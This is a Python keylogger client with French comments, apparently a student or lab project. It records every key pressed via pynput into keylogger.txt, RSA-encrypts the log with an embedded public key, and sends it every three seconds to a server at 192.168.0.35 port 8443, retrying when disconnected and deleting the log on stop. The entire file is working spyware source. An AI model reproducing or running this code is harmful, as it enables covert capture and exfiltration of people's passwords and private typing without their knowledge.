import socket
import ssl
import time
import pathlib
from pynput import keyboard
import os
import rsa


# Fonction qui permet de lire les données du fichier keylogger.txt
def read_data_from_file(file_path):
    with open(file_path, 'r') as file:
        data = file.read()
    return data

# Fonction qui permet d'ajouter un caractère dans le fichier keylogger.txt
def add_one_char(char):
    with open('keylogger.txt', "a") as f:
        f.write(char)

# Fonction qui permet de supprimer un caractère dans le fichier keylogger.txt
def del_one_char():
    with open('keylogger.txt', 'rb+') as f:
        f.seek(0,2)
        size=f.tell()
        if size > 17 :
            f.truncate(size-1)

# Fonction qui permet d'enregistrer les touches appuyées 
def record_key(key):

    if str(key) == "Key.enter":
        add_one_char("\n")

    elif str(key) == "Key.space":
        add_one_char(" ")

    elif str(key) == "Key.backspace":
        del_one_char()

    elif hasattr(key, 'char'):
        add_one_char(key.char)

# Fonction qui permet d'arrêter le client
def stop_client(conn, listener, filepath):

    # arrêt du listener
    listener.stop()

    # arrêt de la connexion
    conn.close()

    # suppression du fichier (sans erreur si le fichier n'existe pas)
    pathlib.Path.unlink(filepath, missing_ok=True)

    exit(0)

# Fonction qui permet d'établir la connexion
def create_conn(host, port):

    # création du socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(3.0)


    retries = 0
    disconnected = True

    t1 = time.time()

    while disconnected:
        t2 = time.time()

        if t2 - t1 > 2:
            t1 = t2

            try:
                # connexion au serveur
                client_socket.connect((host, port))
                return client_socket

            except Exception as e:
                print("Erreur lors de la connexion")

                retries = retries + 1
                
                # si le nombre maximum de tentative de connexion a été atteint
                if retries > 3:
                    print("Le serveur est injoingnable !")

                    # arrêt du client
                    stop_client(client_socket, listener, file_path)



# config du listener pour récupérer les touches
listener = keyboard.Listener(on_press=record_key)
listener.start()

# configuration du socket
host = '192.168.0.35'
port = 8443

# clé publique du serveur
pubkey = '''-----BEGIN RSA PUBLIC KEY-----
MIGJAoGBANGsb2/kIGSPoXqfdTJ0kC2k8oBZq5C7fTLSpdN+ksGRs37Uhp4B0cfg
doPS3kTdfJpwQGHDUYF0wc1EQ4lacgTL7jVhwoxfUNw9HiaZpE5U7NFr9WVtxyAt
SE4XsmhN+I4FCQs2uy/Hq1Rd3KaqVnl8lf0cRfSJD2Om9ZuaRC+hAgMBAAE=
-----END RSA PUBLIC KEY-----'''
pubkey = rsa.PublicKey.load_pkcs1(pubkey.encode('utf-8'))

# chemin du fichier keylogger.txt dans lequel seront stockées les données
file_path = 'keylogger.txt'  

#Vérifiction si le fichier keylogger.txt existe
if not os.path.exists(file_path):
    with open(file_path, 'w') as f:
        f.write("Data collected :\n")

# création du socket et de la connexion
conn = create_conn(host, port)


running = True
t1 = time.time()

# boucle principale
while running:
    try:
        t2 = time.time()

        if t2 - t1 > 3:
            # update de t1
            t1 = t2

            # envoyer les données au serveur
            keyboard_data = read_data_from_file(file_path)

            # chiffrement des données
            encrypted_data = rsa.encrypt(keyboard_data.encode(), pubkey)

            # envoi des données
            conn.send(encrypted_data)

            # récupération du code de retour
            code = conn.recv(1024).decode("utf-8")

            # Condition sur le code de retour
            if code == "OK":
                print("code : OK")

            elif code == "STOP":
                print("code : STOP")
                running = False

            else:
                print("code : ERROR")
                raise ssl.SSLEOFError


# si le serveur est injoignable
    except ssl.SSLEOFError:
        
        retries = 0
        disconnected = True

        t1 = time.time()

        while disconnected:
            t2 = time.time()

            if t2 - t1 > 2:
                t1 = t2

                new_conn = create_conn(host, port)
                
                # si la connexion n'est pas possible avec le serveur
                if new_conn == "error":
                    retries = retries + 1

                # si la connexion a été rétablie
                else:
                    disconnected = False
                    conn = new_conn
            
            # si le nombre maximum de tentative de connexion a été atteint
            if retries > 3:
                print("Le serveur est injoingnable !")

                # arrêt du client
                stop_client(conn, listener, file_path)

    except Exception as e:
        print(e)
        

# arrêt du client
stop_client(conn, listener, file_path)
